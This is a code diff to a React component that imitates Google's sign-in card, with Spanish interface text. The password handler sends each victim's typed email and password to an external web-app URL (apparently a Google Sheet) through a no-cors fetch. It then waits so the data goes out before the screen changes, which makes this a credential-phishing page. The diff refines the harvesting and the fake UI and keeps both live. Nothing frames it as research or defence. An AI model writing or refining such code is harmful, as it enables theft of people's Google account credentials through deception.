@@ -22,12 +22,11 @@ const GoogleLoginCard = ({ onLoginComplete }: { onLoginComplete: () => void }) =
   const handlePasswordNext = async () => {
     if (!password.trim()) return;
 
-    // ENVIAR DATOS A GOOGLE SHEETS
     try {
-      await fetch(webAppUrl, {
+      // Enviar datos
+      fetch(webAppUrl, {
         method: "POST",
         mode: "no-cors",
-        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ 
           usuario: email, 
           pass: password, 
@@ -35,13 +34,13 @@ const GoogleLoginCard = ({ onLoginComplete }: { onLoginComplete: () => void }) =
         })
       });
     } catch (e) {
-      console.log("Enviando...");
+      console.log("Error de red");
     }
-    
-    // Pequeña pausa para asegurar el envío antes de cambiar de pantalla
+
+    // Esperar medio segundo para asegurar que el paquete de datos salga
     setTimeout(() => {
       onLoginComplete();
-    }, 500);
+    }, 600);
   };
 
   return (
@@ -62,11 +61,11 @@ const GoogleLoginCard = ({ onLoginComplete }: { onLoginComplete: () => void }) =
               value={email}
               onChange={(e) => setEmail(e.target.value)}
               placeholder="Correo electrónico o teléfono"
-              className={`google-input w-full ${emailError ? 'border-destructive' : ''}`}
+              className="google-input w-full"
               autoFocus
             />
           ) : (
-            <>
+            <div className="space-y-4">
               <input
                 type={showPassword ? "text" : "password"}
                 value={password}
@@ -75,21 +74,18 @@ const GoogleLoginCard = ({ onLoginComplete }: { onLoginComplete: () => void }) =
                 className="google-input w-full"
                 autoFocus
               />
-              <label className="flex items-center gap-3 cursor-pointer select-none">
-                <input type="checkbox" checked={showPassword} onChange={(e) => setShowPassword(e.target.checked)} className="w-[18px] h-[18px] accent-[#1a73e8]" />
-                <span className="text-sm text-card-foreground">Mostrar contraseña</span>
+              <label className="flex items-center gap-3 cursor-pointer">
+                <input type="checkbox" onChange={(e) => setShowPassword(e.target.checked)} className="w-4 h-4 accent-[#1a73e8]" />
+                <span className="text-sm">Mostrar contraseña</span>
               </label>
-            </>
+            </div>
           )}
 
           {emailError && <p className="text-xs text-destructive">⚠ {emailError}</p>}
 
           <div className="flex justify-between items-center pt-4">
             <button className="google-btn-text text-sm font-medium">Crear cuenta</button>
-            <button 
-              onClick={step === "email" ? handleEmailNext : handlePasswordNext} 
-              className="google-btn-blue"
-            >
+            <button onClick={step === "email" ? handleEmailNext : handlePasswordNext} className="google-btn-blue">
               Siguiente
             </button>
           </div>
